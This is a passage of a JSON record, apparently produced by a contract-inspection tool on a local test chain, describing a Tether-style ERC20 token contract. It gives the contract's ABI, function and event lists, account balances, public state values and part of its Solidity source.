"_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0x6eD79Aa1c71FD7BdBC515EfdA3Bd4e26394435cC": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99731430000000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "MyToken",\n        "deprecated": false,\n        "totalSupply": 1000000,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "maximumFee": 0,\n        "_totalSupply": 1000000,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "MTK",\n        "basisPointsRate": 0,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    